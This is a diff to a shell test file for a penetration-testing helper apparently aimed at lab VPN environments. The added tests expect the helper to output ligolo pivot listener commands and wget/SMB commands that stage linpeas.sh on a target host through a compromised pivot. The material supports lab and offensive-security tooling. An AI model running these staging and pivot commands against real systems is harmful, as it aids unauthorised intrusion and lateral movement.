@@ -69,6 +69,19 @@ commands[impacket-smbserver]=impacket-smbserver
 out=$(dz serve smb ~/tools)
 has "serve smb: copy command" 'copy \\10.10.14.7\share\linpeas.sh .' "$out"
 has "serve smb: only on the VPN IP" "STARTED smb -smb2support -ip 10.10.14.7 -port 445 share ${HOME:A}/tools" "$out"
+# Through a pivot: the ligolo listener, and URLs with the pivot's IP.
+dz -t web01 -ip 172.16.5.15 >/dev/null
+out=$(dz serve ~/tools --via web01)
+has "serve --via: ligolo listener to the VPN IP" "listener_add --addr 0.0.0.0:8000 --to 10.10.14.7:8000 --tcp" "$out"
+has "serve --via: download from the pivot's IP" "wget http://172.16.5.15:8000/linpeas.sh" "$out"
+has "serve --via: still only on the VPN IP" "STARTED python3 -m http.server 8000 --bind 10.10.14.7" "$out"
+has "serve --via an IP, with a port" "listener_add --addr 0.0.0.0:9001 --to 10.10.14.7:9001" "$(dz serve ~/tools 9001 --via 172.16.5.20)"
+has "serve --via port below 1024: needs root on the pivot" "needs root" "$(dz serve ~/tools 80 --via web01)"
+nok "serve --via an unknown host fails" dz serve ~/tools --via nope
+nok "serve smb --via fails" dz serve smb ~/tools --via web01
+has "and says to use HTTP" "use HTTP" "$(dz serve smb ~/tools --via web01 2>&1)"
+dz -t web01 --drop >/dev/null
+
 _dz_attacker_ip() { : }
 has "serve without VPN says why" "is down" "$(dz serve ~/tools 2>&1)"
 _dz_attacker_ip() { print 10.10.14.7 }
@@ -98,11 +111,18 @@ ip() {
     "link show tun0") return 0 ;;
     "route get 10.10.10.10") print "10.10.10.10 via 10.10.14.1 dev tun0 src 10.10.14.7" ;;
     "route get 10.10.10.77") print "10.10.10.77 via 192.168.1.1 dev eth0 src 192.168.1.5" ;;
+    "route get 172.16.5.10") print "172.16.5.10 dev ligolo src 10.10.14.7" ;;
   esac
 }
 commands[ip]=ip
 eq  "vpn check: routed through tun0, no warning" "" "$(_dz_vpn_check 10.10.10.10 2>&1)"
 has "vpn check: other route warns" "goes through eth0, not tun0" "$(_dz_vpn_check 10.10.10.77 2>&1)"
+eq  "vpn check: route through a pivot (ligolo) is fine" "" "$(_dz_vpn_check 172.16.5.10 2>&1)"
+eq  "vpn check: dz -t on a host behind the pivot, no warning" "" "$(dz -t ms01 -ip 172.16.5.10 2>&1 >/dev/null)"
+DZ_PIVOT=()
+has "vpn check: pivot = none warns again" "goes through ligolo, not tun0" "$(_dz_vpn_check 172.16.5.10 2>&1)"
+DZ_PIVOT=('lig*' 'tun9')
+eq  "vpn check: own pivot patterns" "" "$(_dz_vpn_check 172.16.5.10 2>&1)"
 ip() { return 1 }
 has "vpn check: interface missing warns" "tun0 doesn't exist" "$(_dz_vpn_check 10.10.10.10 2>&1)"
 DZ_VPNCHECK=no
